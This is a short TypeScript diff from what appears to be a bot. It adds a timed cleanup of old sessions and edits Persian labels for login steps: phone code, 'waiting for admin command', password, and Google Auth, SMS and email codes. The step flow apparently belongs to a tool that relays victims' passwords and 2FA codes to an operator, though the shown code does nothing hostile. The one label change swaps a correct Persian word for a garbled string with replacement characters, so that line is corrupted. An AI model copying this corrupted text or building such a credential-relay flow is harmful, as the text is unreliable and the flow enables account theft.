@@ -518,6 +518,27 @@ const lastMessageContent = new Map<
 >();
 
 /**
+ * Clean up old sessions (older than 1 hour)
+ */
+const cleanupOldSessions = () => {
+  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
+
+  for (const [sessionId, session] of activeSessions.entries()) {
+    const sessionTime = new Date(session.startTime);
+    if (sessionTime < oneHourAgo) {
+      console.log("🧹 Cleaning up old session:", sessionId);
+      activeSessions.delete(sessionId);
+      // Also clean up message content
+      if (session.messageId) {
+        lastMessageContent.delete(session.messageId);
+      }
+    }
+  }
+};
+
+// Run cleanup every 30 minutes
+setInterval(cleanupOldSessions, 30 * 60 * 1000);
+/**
  * Compare message content and keyboard to check if update is needed
  */
 const isMessageContentDifferent = (
@@ -645,7 +666,7 @@ const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "در انتظار کد تایید شماره",
     waiting_admin: "در انتظار دستور ادمین",
-    auth_password: "وارد کردن رمز عبور",
+    auth_password: "وارد کردن ر��ز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
     auth_email: "وارد کردن کد ایمیل",
